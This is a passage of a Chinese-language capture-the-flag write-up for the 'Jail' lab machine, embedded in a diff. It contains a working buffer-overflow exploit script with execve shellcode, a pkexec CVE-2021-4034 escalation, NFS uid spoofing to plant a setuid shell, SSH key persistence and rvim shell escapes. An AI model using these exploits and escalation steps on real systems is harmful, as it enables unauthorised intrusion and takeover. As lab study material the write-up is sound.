+        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    listen<span class="token punctuation">(</span>sockfd, 200<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    clientlen <span class="token operator">=</span> sizeof<span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        newsockfd <span class="token operator">=</span> accept<span class="token punctuation">(</span>sockfd, <span class="token punctuation">(</span>struct sockaddr*<span class="token punctuation">)</span><span class="token operator">&amp;</span>client_addr, <span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>newsockfd <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            perror<span class="token punctuation">(</span><span class="token string">"Accept error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        pid <span class="token operator">=</span> fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            perror<span class="token punctuation">(</span><span class="token string">"Fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            close<span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            exit<span class="token punctuation">(</span>handle<span class="token punctuation">(</span>newsockfd<span class="token punctuation">))</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            close<span class="token punctuation">(</span>newsockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h3><p>建立了一个套接字，<code>AF_INET</code>(ipv4),<code>SOCK_STREAM</code>(tcp连接)，等会用<code>nc</code>作为客户端交互就行</p>
+<p><img src="/2022/08/22/Jail/image/image_hCx_OJTAS-.png"></p>
+<p>监听端口7411，fork子进程调用<code>handle()</code>，实现功能的代码都在<code>handle()</code>，结合nmap发现打开了7411端口，应该就是这个程序<code>jail</code></p>
+<p><img src="/2022/08/22/Jail/image/image_TjwXMv9lTm.png"></p>
+<p>分析<code>handle()</code>有以下几种交互，</p>
+<pre class="line-numbers language-bash"><code class="language-bash">DEBUG 调试模式
+
+<span class="token comment" spellcheck="true">#auth认证函数，硬编码，这里其实验证密码正确了，也没有什么后续的逻辑操作</span>
+<span class="token comment" spellcheck="true">#char username[256];</span>
+<span class="token comment" spellcheck="true">#char password[256];</span>
+USER admin  验证用户名
+PASS 1974jailbreak<span class="token operator">!</span>  验证密码
+
+<span class="token comment" spellcheck="true">#这两个功能只是打印字符串，什么也不做</span>
+OPEN 打开监狱
+CLOSE 关闭监狱
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>进入DEBUG调试模式</p>
+<p><img src="/2022/08/22/Jail/image/image_znTX_ZFF7L.png"></p>
+<p>当先执行DEBUG模式，再进行密码认证的时候。会打印密码<code>userpass</code>的内存地址</p>
+<p><img src="/2022/08/22/Jail/image/image_C2ZcwZuYjk.png"></p>
+<p>打印了<code>userpass</code>的缓冲区地址</p>
+<p><img src="/2022/08/22/Jail/image/image_fbgYzQy10m.png"></p>
+<p>通过重复执行，发现<code>userpass</code> 缓冲区地址是静态的</p>
+<p><img src="/2022/08/22/Jail/image/image_QSCfx0lyLn.png"></p>
+<h3 id="漏洞的关键点"><a href="#漏洞的关键点" class="headerlink" title="漏洞的关键点"></a>漏洞的关键点</h3><p>代码第21行<code>strcpy()</code> 将<code>password[256]</code>的值复制到<code>userpass[16]</code> ，导致<code>userpass</code>可以造成缓冲区溢出，</p>
+<p><img src="/2022/08/22/Jail/image/image_18XxXE8f5l.png"></p>
+<p>结合<code>compile.sh</code>脚本禁用了DEP，并且<code>userpass</code>的地址是静态的，可以尝试写入<code>shellcode</code> 执行命令</p>
+<h4 id="IDA调试"><a href="#IDA调试" class="headerlink" title="IDA调试"></a>IDA调试</h4><p>计算偏移量，strcpy()处下断点，</p>
+<p><img src="/2022/08/22/Jail/image/image_yM6KPCEs8F.png"></p>
+<p>50个字符串已经崩溃</p>
+<p><img src="/2022/08/22/Jail/image/image_DHTdNHBbRs.png"></p>
+<p>FFFFCAC0-FFFFCAA0&#x3D;20,十进制就是32字节，要留4个字节写return到shellcode(),所以偏移量是<code>28</code>字节。</p>
+<p><img src="/2022/08/22/Jail/image/image_GXKntAqSIg.png"></p>
+<p>构造exp</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#插入字符由：填充字符+ret地址+结束符+shellcode组成</span>
+
+<span class="token comment" spellcheck="true">#填充字符到ESP，28个字符，python -c 'print("A"*28)'</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="token comment" spellcheck="true">#16进制userpass的内存地址+结束符（0xffffcaa0+ \x00）</span>
+\xc0\xca\xff\xff   
+
+<span class="token comment" spellcheck="true">#shellcode</span>
+<span class="token string">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6
+\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80
+\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6
+\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+\x89\xe3\x31\xc9\xcd\x80"</span><span class="token punctuation">;</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在auth() return处下个断点，</p>
+<p><img src="/2022/08/22/Jail/image/image_oYvWonNzJ5.png"></p>
+<p>调试跟进发现shellcode已经被转换成汇编代码执行，这段汇编代码实现Linux&#x2F;x86 - execve(&#x2F;bin&#x2F;sh)</p>
+<p><img src="/2022/08/22/Jail/image/image_3sucqJelmG.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/34060">https://www.exploit-db.com/exploits/34060</a></p>
+<p>执行完这段汇编代码即可返回<code>sh shell</code></p>
+<p>python实现脚本<code> exp.py</code></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+userpass_addr<span class="token operator">=</span> int<span class="token punctuation">(</span>b<span class="token string">'0xffffd610'</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#这个地址要先通过DEBUG获取</span>
+
+<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    ip <span class="token operator">=</span> <span class="token string">'10.10.10.34'</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    ip <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>
+
+<span class="token comment" spellcheck="true"># Get Leaked Address</span>
+shellcode <span class="token operator">=</span>  b<span class="token string">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"</span>
+shellcode <span class="token operator">+=</span> b<span class="token string">"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"</span>
+shellcode <span class="token operator">+=</span> b<span class="token string">"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"</span>
+shellcode <span class="token operator">+=</span> b<span class="token string">"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"</span>
+shellcode <span class="token operator">+=</span> b<span class="token string">"\x89\xe3\x31\xc9\xcd\x80"</span><span class="token punctuation">;</span>
+
+payload <span class="token operator">=</span>  b<span class="token string">"A"</span><span class="token operator">*</span><span class="token number">28</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>userpass_addr <span class="token operator">+</span> <span class="token number">32</span> <span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> shellcode
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">7411</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"OK Ready. Send USER command."</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"USER admin"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"OK Send PASS command."</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">"PASS "</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>到这里分析结束，回到题目</p>
+<h3 id="获取nobody-shell"><a href="#获取nobody-shell" class="headerlink" title="获取nobody shell"></a>获取nobody shell</h3><p>先获取userpass_addr地址</p>
+<p><img src="/2022/08/22/Jail/image/image_K_4r58Oa0s.png"></p>
+<p>执行</p>
+<p><img src="/2022/08/22/Jail/image/image_VFJTruLjMH.png"></p>
+<h3 id="pkexec提权一步到位-非预期解"><a href="#pkexec提权一步到位-非预期解" class="headerlink" title="pkexec提权一步到位(非预期解)"></a>pkexec提权一步到位(非预期解)</h3><p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p><img src="/2022/08/22/Jail/image/image_Ge_KRKrfdr.png"></p>
+<p>本来想curl传脚本过去，但是好像超时了，不给访问网络，不知道是有策略还是什么原因</p>
+<p>所以直接写</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dadvlingd/-CVE-2021-4034">https://github.com/dadvlingd/-CVE-2021-4034</a></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> CVE-2021-4034-py2.py <span class="token operator">|</span>base64
+
+<span class="token keyword">echo</span> <span class="token string">'&amp;#123;编码后的内容&amp;#125;'</span> <span class="token operator">></span>/tmp/pk_base64
+
+<span class="token function">cat</span> /tmp/pk_base64<span class="token operator">|</span>base64 -d <span class="token operator">></span>/tmp/pk.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_jmAq2qPFMX.png"></p>
+<p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h3 id="正常提权"><a href="#正常提权" class="headerlink" title="正常提权"></a>正常提权</h3><p>SELinux</p>
+<p>一种嵌入linux内核的安全机制，目的是为了限制对文件和网络的策略访问，刚才curl超时可能和这个有关。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">id</span>
+uid<span class="token operator">=</span>99<span class="token punctuation">(</span>nobody<span class="token punctuation">)</span> gid<span class="token operator">=</span>99<span class="token punctuation">(</span>nobody<span class="token punctuation">)</span> groups<span class="token operator">=</span>99<span class="token punctuation">(</span>nobody<span class="token punctuation">)</span> context<span class="token operator">=</span>system_u:system_r:unconfined_service_t:s0
+
+<span class="token comment" spellcheck="true">#context的意思是当前是system权限，并且没有限制什么服务，意思是我可以做任何事情（这里指的是SELinux策略没有限制nobody这个用户）</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SELinux/8865268?fr=aladdin">https://baike.baidu.com/item/SELinux/8865268?fr=aladdin</a></p>
+<h4 id="nobody提权到frank"><a href="#nobody提权到frank" class="headerlink" title="nobody提权到frank"></a>nobody提权到frank</h4><p>sudo -l</p>
+<p><code>nobody</code> 可以执行<code>/opt/logreader/logreader.sh</code>，但是没权限看(后面回来看了也没什么信息)</p>
+<p><img src="/2022/08/22/Jail/image/image_YovhXMdbHT.png"></p>
+<p>根据nmap扫描出来的结果，2049端口是nfs服务</p>
+<p><code>showmount -e</code> 列出远程主机上的NFS共享目录</p>
+<p><img src="/2022/08/22/Jail/image/image_-CqVH-lCQW.png"></p>
+<p>挂载之后发现什么也读不到，权限不够。并且<code>nfsshare</code>的权限组居然变成<code>kali</code>，</p>
+<p><img src="/2022/08/22/Jail/image/image_Frc_zd-EM9.png"></p>
+<p>使用前面拿到的<code>nobody shell</code>看一下nfs的配置文件&#x2F;etc&#x2F;exports</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/exports
+/var/nfsshare *<span class="token punctuation">(</span>rw,sync,root_squash,no_all_squash<span class="token punctuation">)</span>
+/opt *<span class="token punctuation">(</span>rw,sync,root_squash,no_all_squash<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>通过查看文档得知，NFS在提供服务时有一个用户映射的机制在里面，配置参数如下：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">all_squash：所有访问用户都映射为匿名用户或用户组；
+no_all_squash（默认）：访问用户先与本机用户匹配，匹配失败后再映射为匿名用户或用户组；
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>通过<code>nobody shell</code> 发现<code>frank</code> 用户组是<code>1000</code>，本地用户和靶机<code>frank</code>匹配失败，所以被映射为<code>1000</code>用户组 ，然后我本地<code>kali</code>的<code>gid=1000</code>所以前面看到远程挂载的用户组是<code>kali</code>&amp;#x20;</p>
+<p><img src="/2022/08/22/Jail/image/image_wOduxQSZ9G.png"></p>
+<p>所以只要本地伪造一个用户<code>frank</code>，权限也设置为<code>frank:x:1000:1000:frank</code>，这个账户就有权限访问<code> /var/nfsshare</code> ，<code>/opt</code></p>
+<h4 id="伪造frank用户-访问nfs"><a href="#伪造frank用户-访问nfs" class="headerlink" title="伪造frank用户 访问nfs"></a>伪造frank用户 访问nfs</h4><p>我kali本地<code>uid=1000</code>，要先将<code>/etc/passwd</code>,<code> /etc/group</code> 里kali的编号1000都改为1001，然后本地创建<code>frank</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#-u 指定uid</span>
+<span class="token function">useradd</span> frank -u 1000
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_P-Ol7d2M3P.png"></p>
+<p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>后面测试发现nfs只匹配uid和gid，用户名不是frank也行，kali本身uid&#x3D;1000的话就不用创建个新的账号这么麻烦了</p>
+<p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>重新挂载<code>/var/nfsshare</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /mnt/nfsshare
+<span class="token function">chmod</span> 777 /mnt/nfsshare  <span class="token comment" spellcheck="true">#不加的话frank没权限</span>
+
+<span class="token comment" spellcheck="true">#-o tcp 不加的话很卡</span>
+<span class="token function">mount</span> -t nfs -o tcp  10.10.10.34:/var/nfsshare/  /mnt/nfsshare/
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>现在用户组识别为<code>frank</code></p>
+<p><img src="/2022/08/22/Jail/image/image_UHnepxeBBr.png"></p>
+<p>nfs挂载服务无法直接执行<code>bash shell</code>远程弹回来, 但是可以将编译好的<code>bash shell</code>程序通过nfs服务上传到远程服务器，然后再添加<code>suid</code>，再通过靶机上<code>nobody</code> 执行上传的<code>bash shell</code></p>
+<p>因为设置了<code>suid</code>位的进程在执行的时候，拥有的权限是进程本身的属主权限，而不是执行的发起者</p>
+<p>，在执行过程中，调用者会暂时获得该文件的所有者权限</p>
+<p>意思就是<code>uid_1000_sh</code> 的文件所有者是<code>frank</code> ，当<code>uid_1000_sh</code>设置了<code>suid</code>位，用<code>nobody</code> 去执行<code>uid_1000_sh</code> 的时候，<code>uid_1000_sh</code> 会以<code>frank</code> 权限被执行，这样就可以导致提权。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">frank@kali:/tmp$ <span class="token function">cat</span> uid_1000_bash.c
+<span class="token comment" spellcheck="true">#define _GNU_SOURCE</span>
+<span class="token comment" spellcheck="true">#include &lt;stdlib.h></span>
+<span class="token comment" spellcheck="true">#include &lt;unistd.h></span>
+
+int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    setresuid<span class="token punctuation">(</span>1000, 1000, 1000<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    system<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+frank@kali:/tmp$ gcc -m32 uid_1000_bash.c -o /mnt/nfsshare/uid_1000_bash
+frank@kali:/tmp$ <span class="token function">chmod</span> 7777 /mnt/nfsshare/uid_1000_bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>nobody</code> 上执行后成功提权到<code>frank</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">script /dev/null
+
+/var/nfsshare/uid_1000_bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_t3uix_vvuo.png"></p>
+<p>这个shell不稳定，写个公钥用ssh连接</p>
+<p><img src="/2022/08/22/Jail/image/image_s0sobiWY0a.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>frank@localhost .ssh<span class="token punctuation">]</span>$ $ <span class="token keyword">echo</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRKFfz2jS4mH1HmJMOhxCg0B/BbBLc4iDMYeR6wG1BKUeospV8EBwNnBDH+Qvg47XBBxhkjZGZToEELQ8ZFBeg7r75pSBkwxAaVG/sC9T8TEwqdr6a/G935eZXBFSzmuhV3sTlcKfMgb4tM5xdgNqRWcoCo3dwiYfya/6Bs6/1TEAmqWotGRjObhgcy95z8uObRmlvimEcLpdhUTJt10+2w63givJlP7OBOsFI4H4N4gMsh1NYQwyR2oUGYyc3suqkqnjDyzQ+7ezoje2sQr1Bg7AQqsI8YTh8ePElSTBEXc2/0WouqhwJ5jKMQP2jzGPF2RmKg9XghoIVQGdUBdh7998ABKyHdjJdWxk3ekNZoxnXp9tBlgVd2OQ8jUHW/sHi0anUwKY4ZhZ6SbJtOPJIm967oR5gLAUjPzVVYMHGSYajy1sJNXAYa9L/ro9F75O7H1cxZuWk7c6wUvJORB3tKovLr9gzKpshTXMDwIna9QzZcTkPBuNzpKVUJ2MHrGc= root@kali'</span> <span class="token operator">>></span> /home/frank/.ssh/authorized_keys
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>登录</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -i /root/.ssh/id_rsa frank@10.10.10.34
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_FC1Rxt2Iy6.png"></p>
+<h4 id="frank提权到adm"><a href="#frank提权到adm" class="headerlink" title="frank提权到adm"></a>frank提权到adm</h4><p>sudo -l</p>
+<p><img src="/2022/08/22/Jail/image/image_3E9B66tx2p.png"></p>
+<p><code>frank</code>可以以<code>adm</code>身份运行<code>rvim</code>，rvim是vim的一种</p>
+<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/rvim">https://linux.die.net/man/1/rvim</a></p>
+<p>命令写死了，参数无法注入</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>执行后进入文本编辑模式，常规<code>vim</code>可以在<code>末行模式</code>下输入<code>:![command]</code> 执行命令</p>
+<p><img src="/2022/08/22/Jail/image/image_4ZVnRD_g0R.png"></p>
+<p>但是rvim禁止执行shell命令</p>
+<p><img src="/2022/08/22/Jail/image/image_iEoAuSIKAZ.png"></p>
+<p>但是有绕过的方式</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>末行模式下输入：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#方法一</span>
+:py <span class="token function">import</span> os<span class="token punctuation">;</span> os.execl<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, <span class="token string">"sh"</span>, <span class="token string">"-c"</span>, <span class="token string">"reset; exec sh"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#方法二</span>
+:python <span class="token function">import</span> pty<span class="token punctuation">;</span> pty.spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_6jhMuK05Uf.png"></p>
+<p>确认后即可获得<code>adm shell</code></p>
+<p><img src="/2022/08/22/Jail/image/image_ZE5RmLDcHM.png"></p>
+<h4 id="adm提权到root"><a href="#adm提权到root" class="headerlink" title="adm提权到root"></a>adm提权到root</h4><p>adm没有运行任何进程，只能查找和adm有关的文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -group adm 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -v -e ^/proc
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_YLNTCors1y.png"></p>
+<p>排除下来只有三个文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash">/var/adm/.keys/note.txt
+/var/adm/.keys/.local/.frank
+/var/adm/.keys/keys.rar
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="下面的扯淡的社工解密时间"><a href="#下面的扯淡的社工解密时间" class="headerlink" title="下面的扯淡的社工解密时间"></a>下面的扯淡的社工解密时间</h4><p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>note.txt</p>
+<pre class="line-numbers language-bash"><code class="language-bash">Note from Administrator:
+Frank, <span class="token keyword">for</span> the last time, your password <span class="token keyword">for</span> anything encrypted must be your last name followed by a 4 digit number and a symbol.
+
+<span class="token comment" spellcheck="true">#翻译</span>
+来自管理员的注释：
+弗兰克，最后一次，您的任何加密密码都必须是您的姓氏，后跟一个 4 位数字和一个符号。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>.frank&amp;#x20;</p>
